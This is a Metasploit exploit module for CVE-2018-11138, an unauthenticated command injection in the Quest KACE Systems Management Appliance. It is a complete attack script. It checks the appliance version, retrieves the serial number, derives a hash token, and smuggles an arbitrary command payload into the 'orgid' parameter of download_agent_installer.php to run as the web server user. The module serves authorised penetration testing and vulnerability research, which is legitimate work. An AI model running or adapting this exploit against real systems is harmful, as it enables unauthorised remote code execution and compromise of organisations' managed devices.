# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Quest KACE Systems Management Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability in Quest KACE
        Systems Management Appliance version 8.0.318 (and possibly prior).
 
        The `download_agent_installer.php` file allows unauthenticated users
        to execute arbitrary commands as the web server user `www`.
 
        A valid Organization ID is required. The default value is `1`.
 
        A valid Windows agent version number must also be provided. If file
        sharing is enabled, the agent versions are available within the
        `\\kace.local\client\agent_provisioning\windows_platform` Samba share.
        Additionally, various agent versions are listed on the KACE website.
 
        This module has been tested successfully on Quest KACE Systems
        Management Appliance K1000 version 8.0 (Build 8.0.318).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;unix&#039;, # FreeBSD
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;DisclosureDate&#039; => &#039;May 31 2018&#039;,
      &#039;Author&#039;         =>
        [
          &#039;Leandro Barragan&#039;, # Discovery and PoC
          &#039;Guido Leo&#039;,        # Discovery and PoC
          &#039;Brendan Coles&#039;,    # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-11138&#039;],
          [&#039;URL&#039;, &#039;https://support.quest.com/product-notification/noti-00000134&#039;],
          [&#039;URL&#039;, &#039;https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;BadChars&#039;    => "\x00\x27",
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl&#039;
            }
        },
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;SERIAL&#039;,        [false, &#039;Serial number&#039;, &#039;&#039;]),
      OptString.new(&#039;ORGANIZATION&#039;,  [true, &#039;Organization ID&#039;, &#039;1&#039;]),
      OptString.new(&#039;AGENT_VERSION&#039;, [true, &#039;Windows agent version&#039;, &#039;8.0.152&#039;])
    ]
  end
 
  def check
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(&#039;common&#039;, &#039;download_agent_installer.php&#039;))
    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end
 
    unless res.code == 302 && res.headers.to_s.include?(&#039;X-KACE-Appliance&#039;)
      vprint_status &#039;Remote host is not a Quest KACE appliance&#039;
      return CheckCode::Safe
    end
 
    unless res.headers[&#039;X-KACE-Version&#039;] =~ /\A([0-9]+)\.([0-9]+)\.([0-9]+)\z/
      vprint_error &#039;Could not determine KACE appliance version&#039;
      return CheckCode::Detected
    end
 
    version = Gem::Version.new res.headers[&#039;X-KACE-Version&#039;].to_s
    vprint_status "Found KACE appliance version #{version}"
 
    # Patched versions : https://support.quest.com/product-notification/noti-00000134
    if version < Gem::Version.new(&#039;7.0&#039;) ||
       (version >= Gem::Version.new(&#039;7.0&#039;) && version < Gem::Version.new(&#039;7.0.121307&#039;)) ||
       (version >= Gem::Version.new(&#039;7.1&#039;) && version < Gem::Version.new(&#039;7.1.150&#039;)) ||
       (version >= Gem::Version.new(&#039;7.2&#039;) && version < Gem::Version.new(&#039;7.2.103&#039;)) ||
       (version >= Gem::Version.new(&#039;8.0&#039;) && version < Gem::Version.new(&#039;8.0.320&#039;)) ||
       (version >= Gem::Version.new(&#039;8.1&#039;) && version < Gem::Version.new(&#039;8.1.108&#039;))
      return CheckCode::Appears
    end
 
    CheckCode::Safe
  end
 
  def serial_number
    return datastore[&#039;SERIAL&#039;] unless datastore[&#039;SERIAL&#039;].to_s.eql? &#039;&#039;
 
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(&#039;common&#039;, &#039;about.php&#039;))
    return unless res
 
    res.body.scan(/Serial Number: ([A-F0-9]+)/).flatten.first
  end
 
  def exploit
    check_code = check
    unless [CheckCode::Appears, CheckCode::Detected].include? check_code
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end
 
    serial = serial_number
    if serial.to_s.eql? &#039;&#039;
      print_error &#039;Could not retrieve appliance serial number. Try specifying a SERIAL.&#039;
      return
    end
    vprint_status "Using serial number: #{serial}"
 
    print_status "Sending payload (#{payload.encoded.length} bytes)"
 
    vars_get = Hash[{
      &#039;platform&#039; => &#039;windows&#039;,
      &#039;serv&#039;     => Digest::SHA256.hexdigest(serial),
      &#039;orgid&#039;    => "#{datastore[&#039;ORGANIZATION&#039;]}#; #{payload.encoded} ",
      &#039;version&#039;  => datastore[&#039;AGENT_VERSION&#039;]
    }.to_a.shuffle]
 
    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(&#039;common&#039;, &#039;download_agent_installer.php&#039;),
      &#039;vars_get&#039; => vars_get
    }, 10)
 
    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end
 
    unless res.headers.to_s.include?(&#039;KACE&#039;) || res.headers.to_s.include?(&#039;KBOX&#039;)
      fail_with Failure::UnexpectedReply, &#039;Unexpected reply&#039;
    end
 
    case res.code
    when 200
      print_good &#039;Payload executed successfully&#039;
    when 404
      fail_with Failure::BadConfig, &#039;The specified AGENT_VERSION is not valid for the specified ORGANIZATION&#039;
    when 302
      if res.headers[&#039;location&#039;].include? &#039;error.php&#039;
        fail_with Failure::UnexpectedReply, &#039;Server encountered an error&#039;
      end
      fail_with Failure::BadConfig, &#039;The specified SERIAL is incorrect&#039;
    else
      print_error &#039;Unexpected reply&#039;
    end
 
    register_dir_for_cleanup "/tmp/agentprov/#{datastore[&#039;ORGANIZATION&#039;]}#;/"
  end
end

